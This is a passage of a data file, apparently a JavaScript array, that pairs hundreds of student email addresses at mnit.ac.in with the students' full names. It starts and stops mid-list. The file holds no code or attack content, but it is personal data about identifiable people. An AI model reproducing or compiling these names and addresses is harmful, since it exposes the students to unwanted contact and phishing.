        {mail: '2019UME1218@mnit.ac.in',
        name: 'ANANYA MAHESHWARI'},
        
        
        {mail: '2019UME1249@mnit.ac.in',
        name: 'SUNARIWAL     MAHESHKUMAR'},
        
        
        {mail: '2019UMT1491@mnit.ac.in',
        name: 'AKHILESH KUMAR'},
        
        
        {mail: '2019UMT1698@mnit.ac.in',
        name: 'AYUSH KUMAR YADAV'},
        
        
        {mail: '2019UMT1780@mnit.ac.in',
        name: 'BIDDIKA LOKESH'},
        
        
        {mail: '2019UMT1855@mnit.ac.in',
        name: 'DEOGAM HELEN PAIKIRAY'},
        
        
        {mail: '2019UMT1869@mnit.ac.in',
        name: 'VISHAL CHAUHAN'},
        
        
        {mail: '2019UCE1127@mnit.ac.in',
        name: 'HRITIK PUSHKAR'},
        
        
        {mail: '2019UCE1170@mnit.ac.in',
        name: 'JATIN DHAKA'},
        
        
        {mail: '2019UCE1745@mnit.ac.in',
        name: 'AJAY PRATAP SINGH'},
        
        
        {mail: '2019UCE1840@mnit.ac.in',
        name: 'HARSH GUPTA'},
        
        
        {mail: '2019UCH1580@mnit.ac.in',
        name: 'NAFISA BALAPURWALA'},
        
        
        {mail: '2019UCH1588@mnit.ac.in',
        name: 'ANKIT PARSOYA'},
        
        
        {mail: '2019UCH1681@mnit.ac.in',
        name: 'ROHIT WADHWANI'},
        
        
        {mail: '2019UCP1088@mnit.ac.in',
        name: 'AYUSH BHURADIA'},
        
        
        {mail: '2019UCP1284@mnit.ac.in',
        name: 'MEHAK ARORA'},
        
        
        {mail: '2019UCP1422@mnit.ac.in',
        name: 'ANURAG TRIVEDI'},
        
        
        {mail: '2019UCP1620@mnit.ac.in',
        name: 'RAKESH SONI'},
        
        
        {mail: '2019UEC1091@mnit.ac.in',
        name: 'DHANANJAY JAJU'},
        
        
        {mail: '2019UEE1143@mnit.ac.in',
        name: 'SADHYA SINGH'},
        
        
        {mail: '2019UEE1309@mnit.ac.in',
        name: 'RAHUL SINGH PARIHAR'},
        
        
        {mail: '2019UME1174@mnit.ac.in',
        name: 'CHITRANG JAIN'},
        
        
        {mail: '2019UME1206@mnit.ac.in',
        name: 'MADHAV GARG'},
        
        
        {mail: '2019UMT1468@mnit.ac.in',
        name: 'VIVEK KUMAR'},
        
        
        {mail: '2019UMT1489@mnit.ac.in',
        name: 'PRIYAL OMPRAKASH    MALVIYA'},
        
        
        {mail: '2019UMT1763@mnit.ac.in',
        name: 'NIKHIL JAIN'},
        
        
        {mail: '2019UMT1861@mnit.ac.in',
        name: 'SABBITHI PRANITH'},
        
        
        {mail: '2019UCE1116@mnit.ac.in',
        name: 'SANJAY BARWAL'},
        
        
        {mail: '2019UCE1525@mnit.ac.in',
        name: 'MUSKAN VERMA'},
        
        
        {mail: '2019UCE1693@mnit.ac.in',
        name: 'AVNISH YASH'},
        
        
        {mail: '2019UCH1485@mnit.ac.in',
        name: 'PALAK AGRAWAL'},
        
        
        {mail: '2019UCH1690@mnit.ac.in',
        name: 'ADITYA KAINTHOLA'},
        
        
        {mail: '2019UCP1264@mnit.ac.in',
        name: 'KAJAL'},
        
        
        {mail: '2019UCP1371@mnit.ac.in',
        name: 'AAKARSH GOYAL'},
        
        
        {mail: '2019UEC1095@mnit.ac.in',
        name: 'BHOOMIKA CHOUDHARY'},
        
        
        {mail: '2019UEC1211@mnit.ac.in',
        name: 'ANUJ BAGARI'},
        
        
        {mail: '2019UEC1467@mnit.ac.in',
        name: 'NISHANT GUPTA'},
        
        
        {mail: '2019UEC1613@mnit.ac.in',
        name: 'SAURABH KUMAR AGRAWAL'},
        
        
        {mail: '2019UEE1043@mnit.ac.in',
        name: 'AKASH SINGH'},
        
        
        {mail: '2019UEE1156@mnit.ac.in',
        name: 'SUNIL MEENA'},
        
        
        {mail: '2019UEE1236@mnit.ac.in',
        name: 'ARYAN PRATAP SINGH'},
        
        
        {mail: '2019UEE1320@mnit.ac.in',
        name: 'AASTHA MEENA'},
        
        
        {mail: '2019UEE1509@mnit.ac.in',
        name: 'AYUSH DHRUVE'},
        
        
        {mail: '2019UEE1847@mnit.ac.in',
        name: 'SARANSH GOYAL'},
        
        
        {mail: '2019UME1357@mnit.ac.in',
        name: 'CHIRAYU RANKAWAT'},
        
        
        {mail: '2019UMT1663@mnit.ac.in',
        name: 'GAUTAM KUMAR MEENA'},
        
        
        {mail: '2019UMT1676@mnit.ac.in',
        name: 'SAANJH THADA'},
        
        
        {mail: '2019UCE1546@mnit.ac.in',
        name: 'SHIVAM AGARWAL'},
        
        
        {mail: '2019UCH1533@mnit.ac.in',
        name: 'ARJUN SINGH'},
        
        
        {mail: '2019UCH1594@mnit.ac.in',
        name: 'RISHI PURWAR'},
        
        
        {mail: '2019UCH1644@mnit.ac.in',
        name: 'ASHLIN JOSHY CHEERAN'},
        
        
        {mail: '2019UCP1052@mnit.ac.in',
        name: 'BHANDARI RAGHAV SHYAMSUNDAR'},
        
        
        {mail: '2019UCP1375@mnit.ac.in',
        name: 'SIDDHI GOYAL'},
        
        
        {mail: '2019UCP1390@mnit.ac.in',
        name: 'NAMAN JAIN'},
        
        
        {mail: '2019UCP1426@mnit.ac.in',
        name: 'HITESH VIJAY'},
        
        
        {mail: '2019UEC1378@mnit.ac.in',
        name: 'LAKSHYA VIJAY'},
        
        
        {mail: '2019UEC1514@mnit.ac.in',
        name: 'INDER KUMAR SHARMA'},
        
        
        {mail: '2019UEE1322@mnit.ac.in',
        name: 'ROHIT MEENA'},
        
        
        {mail: '2019UEE1333@mnit.ac.in',
        name: 'SUBHASH PURI'},
        
        
        {mail: '2019UEE1742@mnit.ac.in',
        name: 'SAMBHAV JAIN'},
        
        
        {mail: '2019UME1605@mnit.ac.in',
        name: 'ATHARVA PATIL'},
        
        
        {mail: '2019UME1837@mnit.ac.in',
        name: 'RUDRAKSH GUPTA'},
        
        
        {mail: '2019UMT1269@mnit.ac.in',
        name: 'UDBHAV NAVIN CHITRANSH'},
        
        
        {mail: '2019UMT1507@mnit.ac.in',
        name: 'JATIN'},
        
        
        {mail: '2019UMT1672@mnit.ac.in',
        name: 'MITUSHI AGRAWAL'},
        
        
        {mail: '2019UMT1811@mnit.ac.in',
        name: 'VINAY KUMAR'},
        
        
        {mail: '2019UMT1856@mnit.ac.in',
        name: 'ANU RAGHAV'},
        
        
        {mail: '2019UCE1129@mnit.ac.in',
        name: 'YOGESH PARIHAR'},
        
        
        {mail: '2019UCE1146@mnit.ac.in',
        name: 'PRAVEEN RAJENDRAJI'},
        
        
        {mail: '2019UCE1441@mnit.ac.in',
        name: 'ANURAG SINGH'},
        
        
        {mail: '2019UCE1599@mnit.ac.in',
        name: 'AGRAWAL SAURABH PREMSANKAR'},
        
        
        {mail: '2019UCH1276@mnit.ac.in',
        name: 'AAYUSHI JOSHI'},
        
        
        {mail: '2019UCH1498@mnit.ac.in',
        name: 'PIYUSH JAIN'},
        
        
        {mail: '2019UCH1602@mnit.ac.in',
        name: 'SUNIDHI DUGAWA'},
        
        
        {mail: '2019UCH1764@mnit.ac.in',
        name: 'NITIN VYAS'},
        
        
        {mail: '2019UCH1788@mnit.ac.in',
        name: 'KSHITIJ SINGH CHANDEL'},
        
        
        {mail: '2019UCP1020@mnit.ac.in',
        name: 'MUDIT KOTHARI'},
        
        
        {mail: '2019UCP1025@mnit.ac.in',
        name: 'RAHUL AGARWAL'},
        
        
        {mail: '2019UCP1313@mnit.ac.in',
        name: 'ANDREA MARY GEORGE'},
        
        
        {mail: '2019UEC1124@mnit.ac.in',
        name: 'ABHINAV KUMAR'},
        
        
        {mail: '2019UEE1294@mnit.ac.in',
        name: 'AMAN KUMAR PATEL'},
        
        
        {mail: '2019UEE1795@mnit.ac.in',
        name: 'NIKHIL SINHA'},
        
        
        {mail: '2019UEE1858@mnit.ac.in',
        name: 'BINIWALE AATREY SUNIL'},
        
        
        {mail: '2019UME1038@mnit.ac.in',
        name: 'NIKHIL BAIRWA'},
        
        
        {mail: '2019UME1132@mnit.ac.in',
        name: 'MAHENDRA MEENA'},
        
        
        {mail: '2019UME1205@mnit.ac.in',
        name: 'HARSHIT GARG'},
        
        
        {mail: '2019UMT1671@mnit.ac.in',
        name: 'NEHAL AGARWAL'},
        
        
        {mail: '2019UCE1109@mnit.ac.in',
        name: 'ASHISH PRATAP'},
        
        
        {mail: '2019UCE1136@mnit.ac.in',
        name: 'ANAND KUMAR'},
        
        
        {mail: '2019UCP1274@mnit.ac.in',
        name: 'DAMYANTI'},
        
        
        {mail: '2019UCP1377@mnit.ac.in',
        name: 'PETHANI SMIT'},
        
        
        {mail: '2019UCP1661@mnit.ac.in',
        name: 'ISHIKA PANWAR'},
        
        
        {mail: '2019UCP1857@mnit.ac.in',
        name: 'SAVKARE MANISH RAMESHCHANDRA'},
        
        
        {mail: '2019UEC1016@mnit.ac.in',
        name: 'ADITYA GUPTA'},
        
        
        {mail: '2019UEC1039@mnit.ac.in',
        name: 'ANSHUL SHARMA'},
        
        
        {mail: '2019UEC1237@mnit.ac.in',
        name: 'NAMAN KUMAR'},
        
        
        {mail: '2019UEC1342@mnit.ac.in',
        name: 'RAHUL JANGIR'},
        
        
        {mail: '2019UEC1612@mnit.ac.in',
        name: 'ANKITA TULSYAN'},
        
        
        {mail: '2019UEC1860@mnit.ac.in',
        name: 'LAKKI DEEKSHITH'},
        
        
        {mail: '2019UEE1077@mnit.ac.in',
        name: 'RHYDAM GUPTA'},
        
        
        {mail: '2019UEE1300@mnit.ac.in',
        name: 'VISHAL'},
        
        
        {mail: '2019UEE1651@mnit.ac.in',
        name: 'SAMRADH DHINGRA'},
        
        
        {mail: '2019UME1168@mnit.ac.in',
        name: 'SHAILESH SUTHAR'},
        
        
        {mail: '2019UME1194@mnit.ac.in',
        name: 'ANSHUMAN SINGH'},
        
        
        {mail: '2019UME1208@mnit.ac.in',
        name: 'SHIVAM KUMAR SINGHAL'},
        
        
        {mail: '2019UME1586@mnit.ac.in',
        name: 'HARSHA BIDAWATKA'},
        
        
        {mail: '2019UME1808@mnit.ac.in',
        name: 'MD IMRAN AHMAD'},
        
        
        {mail: '2019UCE1117@mnit.ac.in',
        name: 'MANISHA SATTAWAN'},
        
        
        {mail: '2019UCE1616@mnit.ac.in',
        name: 'VARTIKA DHOOT'},
        
        
        {mail: '2019UCE1721@mnit.ac.in',
        name: 'AJAY SHARMA'},
        
        
        {mail: '2019UCH1144@mnit.ac.in',
        name: 'ROHIT KUMAR THAKUR'},
        
        
        {mail: '2019UCH1476@mnit.ac.in',
        name: 'AKASH PATHAK'},
        
        
        {mail: '2019UCH1497@mnit.ac.in',
        name: 'KARISHMA SANKHLA'},
        
        
        {mail: '2019UCH1535@mnit.ac.in',
        name: 'RITIK KUMAR'},
        
        
        {mail: '2019UCH1585@mnit.ac.in',
        name: 'AMAN SUKHWAL'},
        
        
        {mail: '2019UCH1695@mnit.ac.in',
        name: 'NAMAN SAINI'},
        
        
        {mail: '2019UCH1734@mnit.ac.in',
        name: 'RAHUL MEENA'},
        
        
        {mail: '2019UCP1418@mnit.ac.in',
        name: 'ANUJ KUMAR JAIMINI'},
        
        
        {mail: '2019UEE1503@mnit.ac.in',
        name: 'NISITHA POTLA'},
        
        
        {mail: '2019UME1197@mnit.ac.in',
        name: 'MAYANK SOLANKI'},
        
        
        {mail: '2019UME1200@mnit.ac.in',
        name: 'NARESH KUMAR'},
        
        
        {mail: '2019UME1245@mnit.ac.in',
        name: 'MANVI MODI'},
        
        
        {mail: '2019UME1642@mnit.ac.in',
        name: 'SANDEEP KHICHAR'},
        
        
        {mail: '2019UME1662@mnit.ac.in',
        name: 'NITIK GUPTA'},
        
        
        {mail: '2019UMT1308@mnit.ac.in',
        name: 'ADHAU TUSHAR PRAKASH'},
        
        
        {mail: '2019UMT1464@mnit.ac.in',
        name: 'RICHPAL CHOUDHARY'},
        
        
        {mail: '2019UMT1664@mnit.ac.in',
        name: 'AVISH JAIN'},
        
        
        {mail: '2019UCE1139@mnit.ac.in',
        name: 'ASHIMA'},
        
        
        {mail: '2019UCE1140@mnit.ac.in',
        name: 'VANSHIKA MAAN'},
        
        
        {mail: '2019UCE1147@mnit.ac.in',
        name: 'NEELMANI'},
        
        
        {mail: '2019UCE1685@mnit.ac.in',
        name: 'DEEPAK SHUKLA'},
        
        
        {mail: '2019UCE1714@mnit.ac.in',
        name: 'RAHUL GARG'},
        
        
        {mail: '2019UCE1797@mnit.ac.in',
        name: 'YASHI AGRAWAL'},
        
        
        {mail: '2019UCH1504@mnit.ac.in',
        name: 'MALINI MINTU ROY'},
        
        
        {mail: '2019UCH1531@mnit.ac.in',
        name: 'HIRDESH GARG'},
        
        
        {mail: '2019UCP1348@mnit.ac.in',
        name: 'ASHUTOSH POKHRIYAL'},
        
        
        {mail: '2019UCP1417@mnit.ac.in',
        name: 'VAIBHAV CHOUDHARY'},
        
        
        {mail: '2019UCP1420@mnit.ac.in',
        name: 'SAMYAK JAIN'},
        
        
        {mail: '2019UEC1003@mnit.ac.in',
        name: 'KHUSHI CHHABRA'},
        
        
        {mail: '2019UEC1114@mnit.ac.in',
        name: 'ADAMYA KAUSHIK'},
        
        
        {mail: '2019UEC1850@mnit.ac.in',
        name: 'ANKIT GUPTA'},
        
        
        {mail: '2019UEE1511@mnit.ac.in',
        name: 'HITESH KUMAR KHATRI'},
        
        
        {mail: '2019UME1141@mnit.ac.in',
        name: 'RAHUL RAJ'},
        
        
        {mail: '2019UME1219@mnit.ac.in',
        name: 'APOORVA RAJ'},
        
        
        {mail: '2019UME1251@mnit.ac.in',
        name: 'MANAS'},
        
        
        {mail: '2019UMT1621@mnit.ac.in',
        name: 'ARJUN ROY'},
        
        
        {mail: '2019UMT1696@mnit.ac.in',
        name: 'MUDIT DUBEY'},
        
        
        {mail: '2019UCE1844@mnit.ac.in',
        name: 'YASHU KUMAR BAIRWA'},
        
        
        {mail: '2019UCH1303@mnit.ac.in',
        name: 'GARASIYA AJAYKUMAR RAMESHBHAI'},
        
        
        {mail: '2019UCH1454@mnit.ac.in',
        name: 'ANIL KUMAR'},
        
        
        {mail: '2019UCH1458@mnit.ac.in',
        name: 'RAHUL DHAKAD'},
        
        
        {mail: '2019UCH1563@mnit.ac.in',
        name: 'GOURAV KARGWAL'},
        
        
        {mail: '2019UCH1718@mnit.ac.in',
        name: 'JITENDRA SHARMA'},
        
        
        {mail: '2019UCH1817@mnit.ac.in',
        name: 'DEEPALI JANGID'},
        
        
        {mail: '2019UCP1195@mnit.ac.in',
        name: 'PRITISHA SOMANI'},
        
        
        {mail: '2019UCP1421@mnit.ac.in',
        name: 'HIRALAL PRASAD'},
        
        
        {mail: '2019UEC1019@mnit.ac.in',
        name: 'MOHIT KUMAR'},
        
        
        {mail: '2019UEC1522@mnit.ac.in',
        name: 'VENGALA AKSHAY KUMAR'},
        
        
        {mail: '2019UEC1625@mnit.ac.in',
        name: 'SHISHUPAL CHAHAR'},
        
        
        {mail: '2019UEC1634@mnit.ac.in',
        name: 'KAMAL NAYAN GOYAL'},
        
        
        {mail: '2019UEC1754@mnit.ac.in',
        name: 'SONU KUMAR GUPTA'},
        
        
        {mail: '2019UEE1266@mnit.ac.in',
        name: 'KULDEEP SINGH'},
        
        
        {mail: '2019UEE1272@mnit.ac.in',
        name: 'MAHENDRA JEENGAR'},
        
        
        {mail: '2019UME1126@mnit.ac.in',
        name: 'FATEH SINGH BHATI'},
        
        
        {mail: '2019UME1152@mnit.ac.in',
        name: 'SANDEEP SINGH'},
        
        
        {mail: '2019UMT1253@mnit.ac.in',
        name: 'YASH CHANDRA'},
        
        
        {mail: '2019UMT1806@mnit.ac.in',
        name: 'LAVNEESH'},
        
        
        {mail: '2019UCE1104@mnit.ac.in',
        name: 'ABHISHEK CHAUHAN'},
        
        
        {mail: '2019UCE1198@mnit.ac.in',
        name: 'NITISH SHARMA'},
        
        
        {mail: '2019UCE1518@mnit.ac.in',
        name: 'PUNEET AGARWAL'},
        
        
        {mail: '2019UCE1610@mnit.ac.in',
        name: 'VINEET KUMAR SHARMA'},
        
        
        {mail: '2019UCH1486@mnit.ac.in',
        name: 'PARISHREE AGARWAL'},
        
        
        {mail: '2019UCH1562@mnit.ac.in',
        name: 'ANMOL BHANDARI'},
        
        
        {mail: '2019UCH1683@mnit.ac.in',
        name: 'ANIKET KUMAR SAROJ'},
        
        
        {mail: '2019UCP1413@mnit.ac.in',
        name: 'SIDDHARTH MANDAWARIA'},
        
        
        {mail: '2019UEC1694@mnit.ac.in',
        name: 'ANKUR NARAYAN SINGH'},
        
        
        {mail: '2019UEE1260@mnit.ac.in',
        name: 'SUNIL KUMAR'},
        
        
        {mail: '2019UEE1285@mnit.ac.in',
        name: 'PRADHUMAN KUMAR'},
        
        
        {mail: '2019UEE1332@mnit.ac.in',
        name: 'UMAID GOMLADU'},
        
        
        {mail: '2019UEE1463@mnit.ac.in',
        name: 'RAVIKANT'},
        
        
        {mail: '2019UEE1785@mnit.ac.in',
        name: 'HITESH SINGH RANA'},
        
        
        {mail: '2019UME1233@mnit.ac.in',
        name: 'PUNEET SINGH'},
        
        
        {mail: '2019UME1843@mnit.ac.in',
        name: 'RITIK KATIYAR'},
        
        
        {mail: '2019UMT1089@mnit.ac.in',
        name: 'ANUBHAV JAIN'},
        
        
        {mail: '2019UMT1480@mnit.ac.in',
        name: 'NAYANIKA KUMAWAT'},
        
        
        {mail: '2019UMT1490@mnit.ac.in',
        name: 'PAWAN SINGH BIRDA'},
        
        
        {mail: '2019UMT1868@mnit.ac.in',
        name: 'VIREN WANEKAR'},
        
        
        {mail: '2019UCE1528@mnit.ac.in',
        name: 'HARSH CHANDEL'},
        
        
        {mail: '2019UCH1460@mnit.ac.in',
        name: 'SHIVA GIRI'},
        
        
        {mail: '2019UCH1506@mnit.ac.in',
        name: 'KRISHNA VARSHNEY'},
        
        
        {mail: '2019UCH1572@mnit.ac.in',
        name: 'DEVANSHU SINGH'},
        
        
        {mail: '2019UCH1741@mnit.ac.in',
        name: 'SEJAL GUPTA'},
        
        
        {mail: '2019UCP1362@mnit.ac.in',
        name: 'KHUSHI DOKWAL'},
        
        
        {mail: '2019UCP1647@mnit.ac.in',
        name: 'SASI SEKHAR KOGANTI'},
        
        
        {mail: '2019UCP1708@mnit.ac.in',
        name: 'SAMYAK RAVI JAIN'},
        
        
        {mail: '2019UEC1083@mnit.ac.in',
        name: 'AVANTIKA MEENA'},
        
        
        {mail: '2019UEC1604@mnit.ac.in',
        name: 'AKSHTA RAI'},
        
        
        {mail: '2019UEC1867@mnit.ac.in',
        name: 'ANUSHKA MEENA'},
        
        
        {mail: '2019UEE1293@mnit.ac.in',
        name: 'LEKHIKA GUPTA'},
        
        
        {mail: '2019UEE1304@mnit.ac.in',
        name: 'VEDANT DAMESHA'},
        
        
        {mail: '2019UEE1307@mnit.ac.in',
        name: 'TUSHAR GARG'},
        
        
        {mail: '2019UEE1392@mnit.ac.in',
        name: 'PRIYA GAUR'},
        
        
        {mail: '2019UME1188@mnit.ac.in',
        name: 'CHARCHIT BANSAL'},
        
        
        {mail: '2019UME1581@mnit.ac.in',
        name: 'PIYUSH KUMAR MISHRA'},
        
        
        {mail: '2019UME1739@mnit.ac.in',
        name: 'PRIYANKA KUMARI'},
        
        
        {mail: '2019UMT1445@mnit.ac.in',
        name: 'VIKHYAT KESARWANI'},
        
        
        {mail: '2019UMT1689@mnit.ac.in',
        name: 'SHRUTI GUPTA'},
        
        
        {mail: '2019UCH1558@mnit.ac.in',
        name: 'ABHINAV SINGH'},
        
        
        {mail: '2019UCH1587@mnit.ac.in',
        name: 'DHEERAJ'},
        
        
        {mail: '2019UCP1335@mnit.ac.in',
        name: 'DEELIP SINGH RATHORE'},
        
        
        {mail: '2019UCP1389@mnit.ac.in',
        name: 'ABHAY KUMAR SAIN'},
        
        
        {mail: '2019UCP1394@mnit.ac.in',
        name: 'SINGH KARTIK YASHWANT'},
        
        
        {mail: '2019UCP1450@mnit.ac.in',
        name: 'DASARI PAVAN SAI'},
        
        
        {mail: '2019UEC1027@mnit.ac.in',
        name: 'MOHIT KUMAR SONIWAL'},
        
        
        {mail: '2019UEC1047@mnit.ac.in',
        name: 'AYUSH GUPTA'},
        
        
        {mail: '2019UEC1521@mnit.ac.in',
        name: 'OMPAL SINGH DEORA'},
        
        
        {mail: '2019UEE1290@mnit.ac.in',
        name: 'PAWAN MEENA'},
        
        
        {mail: '2019UEE1461@mnit.ac.in',
        name: 'PALLVI'},
        
        
        {mail: '2019UEE1793@mnit.ac.in',
        name: 'GARIMA HARDASANI'},
        
        
        {mail: '2019UEE1818@mnit.ac.in',
        name: 'VADLAPATLA TARAKA'},
        
        
        {mail: '2019UME1178@mnit.ac.in',
        name: 'SOMAVARAPU ADITHYA'},
        
        
        {mail: '2019UME1484@mnit.ac.in',
        name: 'JASWANT JANI'},
        
        
        {mail: '2019UME1756@mnit.ac.in',
        name: 'RAHUL'},
        
        
        {mail: '2019UME1827@mnit.ac.in',
        name: 'DEEPAK PRAJAPATI'},
        
        
        {mail: '2019UMT1472@mnit.ac.in',
        name: 'PIYUSH PANKAJ'},
        
        
        {mail: '2019UMT1482@mnit.ac.in',
        name: 'DURREZ AHMED'},
        
        
        {mail: '2019UMT1679@mnit.ac.in',
        name: 'MONISH PATIDAR'},
        
        
        {mail: '2019UCE1186@mnit.ac.in',
        name: 'HIMANSH RAJ AGRAWAL'},
        
        
        {mail: '2019UCE1775@mnit.ac.in',
        name: 'ABHISHEK KUMAR'},
        
        
        {mail: '2019UCE1865@mnit.ac.in',
        name: 'MAYANK GUPTA'},
        
        
        {mail: '2019UCH1636@mnit.ac.in',
        name: 'ABHIJEET SINGH PARMAR'},
        
        
        {mail: '2019UCP1325@mnit.ac.in',
        name: 'AMIT KUMAR MEENA'},
        
        
        {mail: '2019UCP1382@mnit.ac.in',
        name: 'ASHISH PUNIYA'},
        
        
        {mail: '2019UCP1388@mnit.ac.in',
        name: 'AMAN MITTAL'},
        
        
        {mail: '2019UCP1411@mnit.ac.in',
        name: 'SHASHVAT JAIN'},
        
        
        {mail: '2019UCP1423@mnit.ac.in',
        name: 'SANDEEP MANDAL'},
        
        
        {mail: '2019UCP1680@mnit.ac.in',
        name: 'AAYUSH BANSAL'},
        
        
        {mail: '2019UCP1682@mnit.ac.in',
        name: 'GAURAV SINGH CHOUDHARY'},
        
        
        {mail: '2019UEC1004@mnit.ac.in',
        name: 'SHRUTI ROY'},
        
        
        {mail: '2019UEE1130@mnit.ac.in',
        name: 'ANTU SAURAV'},
        
        
        {mail: '2019UEE1283@mnit.ac.in',
        name: 'GYANENDRA PATHAK'},
        
        
        {mail: '2019UEE1601@mnit.ac.in',
        name: 'ANKIT ANAND'},
        
        
        {mail: '2019UME1196@mnit.ac.in',
        name: 'RAHUL KUMAR MEENA'},
        
        
        {mail: '2019UME1203@mnit.ac.in',
        name: 'HARSH VARDHAN'},
        
        
        {mail: '2019UMT1452@mnit.ac.in',
        name: 'CHETAN GOYAL'},
        
        
        {mail: '2019UMT1517@mnit.ac.in',
        name: 'DIVYANSHU KUMAWAT'},
        
        
        {mail: '2019UMT1668@mnit.ac.in',
        name: 'ARCHANA MALI'},
        
        
        {mail: '2019UCE1100@mnit.ac.in',
        name: 'DEVESH JHAJHRIA'},
        
        
        {mail: '2019UCP1331@mnit.ac.in',
        name: 'NITISH BHARDWAJ'},
        
        
        {mail: '2019UCP1352@mnit.ac.in',
        name: 'VISHWAS AGRAWAL'},
        
        
        {mail: '2019UCP1379@mnit.ac.in',
        name: 'ISHU AGARWAL'},
        
        
        {mail: '2019UCP1397@mnit.ac.in',
        name: 'AKASH BOSE'},
        
        
        {mail: '2019UCP1691@mnit.ac.in',
        name: 'RITIK RAJ'},
        
        
        {mail: '2019UEC1024@mnit.ac.in',
        name: 'MUSKAN'},
        
        
        {mail: '2019UEC1031@mnit.ac.in',
        name: 'MOHIT SALVI'},
        
        
        {mail: '2019UEC1040@mnit.ac.in',
        name: 'MANVENDRA YADAV'},
        
        
        {mail: '2019UEC1048@mnit.ac.in',
        name: 'SHORYA GOYAL'},
        
        
        {mail: '2019UEC1800@mnit.ac.in',
        name: 'GAURAV KUMAR'},
        
        
        {mail: '2019UEE1257@mnit.ac.in',
        name: 'ADITYA AGRAWAL'},
        
        
        {mail: '2019UEE1261@mnit.ac.in',
        name: 'PRIYANSHU JHA'},
        
        
        {mail: '2019UEE1286@mnit.ac.in',
        name: 'ABHISHEK SHUKLA'},
        
        
        {mail: '2019UME1182@mnit.ac.in',
        name: 'MANYA GUPTA'},
        
        
        {mail: '2019UME1248@mnit.ac.in',
        name: 'PRATEEK YADAV'},
        
        
        {mail: '2019UME1419@mnit.ac.in',
        name: 'SHASHANK DINESH SHET'},
        
        
        {mail: '2019UMT1743@mnit.ac.in',
        name: 'MANU MAHESHWARI'},
        
        
        {mail: '2019UMT1771@mnit.ac.in',
        name: 'ABHISHEK SINGH'},
        
        
        {mail: '2019UMT1853@mnit.ac.in',
        name: 'HIMANSHU JANGID'},
        
        
        {mail: '2019UCE1106@mnit.ac.in',
        name: 'TUSHAR SHARMA'},
        
        
        {mail: '2019UCH1387@mnit.ac.in',
        name: 'ARYAN KHAN'},
        
        
        {mail: '2019UCH1499@mnit.ac.in',
        name: 'KOUSHIKI NAGAR'},
        
        
        {mail: '2019UCH1574@mnit.ac.in',
        name: 'VAIDIK BALIA'},
        
        
        {mail: '2019UCP1369@mnit.ac.in',
        name: 'MANHAR SINGH SACHDEV'},
        
        
        {mail: '2019UEC1096@mnit.ac.in',
        name: 'KRATIKA SINGHAL'},
        
        
        {mail: '2019UEC1597@mnit.ac.in',
        name: 'NAMAN DHAMANI'},
        
        
        {mail: '2019UEC1749@mnit.ac.in',
        name: 'HARENDRA KUMAR'},
        
        
        {mail: '2019UEE1280@mnit.ac.in',
        name: 'SAHIL JAISWAL'},
        
        
        {mail: '2019UEE1288@mnit.ac.in',
        name: 'KISHAN SONI'},
        
        
        {mail: '2019UEE1635@mnit.ac.in',
        name: 'ANKIT SHARMA'},
        
        
        {mail: '2019UEE1692@mnit.ac.in',
        name: 'SHAURYA PRATAP SINGH'},
        
        
        {mail: '2019UEE1864@mnit.ac.in',
        name: 'AKASH KUMAR OJHA'},
        
        
        {mail: '2019UME1184@mnit.ac.in',
        name: 'SILKY SARRAF'},
        
        
        {mail: '2019UME1214@mnit.ac.in',
        name: 'RAJAN GUPTA'},
        
        
        {mail: '2019UME1220@mnit.ac.in',
        name: 'VISHAL KUMAR'},
        
        
        {mail: '2019UME1238@mnit.ac.in',
        name: 'NITIN SHARMA'},
        
        
        {mail: '2019UME1730@mnit.ac.in',
        name: 'ABHISHEK KUMAR GUPTA'},
        
        
        {mail: '2019UMT1477@mnit.ac.in',
        name: 'PULIMADDI PRATHYUSHA'},
        
        
        {mail: '2019UMT1828@mnit.ac.in',
        name: 'MAYANK RAVI'},
        
        
        {mail: '2019UCE1044@mnit.ac.in',
        name: 'GAURAV JAIN'},
        
        
        {mail: '2019UCE1727@mnit.ac.in',
        name: 'GARGI KASHYAP'},
        
        
        {mail: '2019UCH1475@mnit.ac.in',
        name: 'ADITYA GUPTA'},
        
        
        {mail: '2019UCH1567@mnit.ac.in',
        name: 'HRITIK FAGERIA'},
        
        
        {mail: '2019UCH1575@mnit.ac.in',
        name: 'SHRUTI SHANIA'},
        
        
        {mail: '2019UCH1633@mnit.ac.in',
        name: 'PIYUSH MISHRA'},
        
        
        {mail: '2019UCP1279@mnit.ac.in',
        name: 'ANUJ SONI'},
        
        
        {mail: '2019UCP1650@mnit.ac.in',
        name: 'HARSHITA BHARATKUMAR MISTRY'},
        
        
        {mail: '2019UEC1524@mnit.ac.in',
        name: 'KATRU LEELA MADHAV'},
        
        
        {mail: '2019UEC1589@mnit.ac.in',
        name: 'RAHUL KIRAR'},
        
        
        {mail: '2019UEC1805@mnit.ac.in',
        name: 'VARUN PANDEY'},
        
        
        {mail: '2019UEE1271@mnit.ac.in',
        name: 'VISHAL KUMAR'},
        
        
        {mail: '2019UEE1278@mnit.ac.in',
        name: 'SOURABH KHANDELWAL'},
        
        
        {mail: '2019UME1172@mnit.ac.in',
        name: 'SAMAKSH KOTHARI'},
        
        
        {mail: '2019UME1199@mnit.ac.in',
        name: 'SHUBHAM MEENA'},
        
        
        {mail: '2019UME1731@mnit.ac.in',
        name: 'HARSHIT KHANDELWAL'},
        
        
        {mail: '2019UME1760@mnit.ac.in',
        name: 'SIDDHANT RAJ SAXENA'},
        
        
        {mail: '2019UMT1428@mnit.ac.in',
        name: 'SHUBHAM VERMA'},
        
        
        {mail: '2019UMT1469@mnit.ac.in',
        name: 'SHIV PRASAD PARIHAR'},
        
        
        {mail: '2019UMT1851@mnit.ac.in',
        name: 'ANKIT GUPTA'},
        
        
        {mail: '2019UCE1128@mnit.ac.in',
        name: 'SIYA GURJAR'},
        
        
        {mail: '2019UCE1226@mnit.ac.in',
        name: 'BHAVESH SHARMA'},
        
        
        {mail: '2019UCE1849@mnit.ac.in',
        name: 'ADITYA SHARMA'},
        
        
        {mail: '2019UCE1852@mnit.ac.in',
        name: 'DARPAN GUPTA'},
        
        
        {mail: '2019UCH1532@mnit.ac.in',
        name: 'PRATIK SHARMA'},
        
        
        {mail: '2019UCH1565@mnit.ac.in',
        name: 'AADARSH DADHA'},
        
        
        {mail: '2019UCH1752@mnit.ac.in',
        name: 'SANJAY KUMAR'},
        
        
        {mail: '2019UCH1801@mnit.ac.in',
        name: 'SOYAB KHAN'},
        
        
        {mail: '2019UCP1345@mnit.ac.in',
        name: 'SANSKAR MUNDANIYA'},
        
        
        {mail: '2019UCP1358@mnit.ac.in',
        name: 'KUNAL VERMA'},
        
        
        {mail: '2019UCP1373@mnit.ac.in',
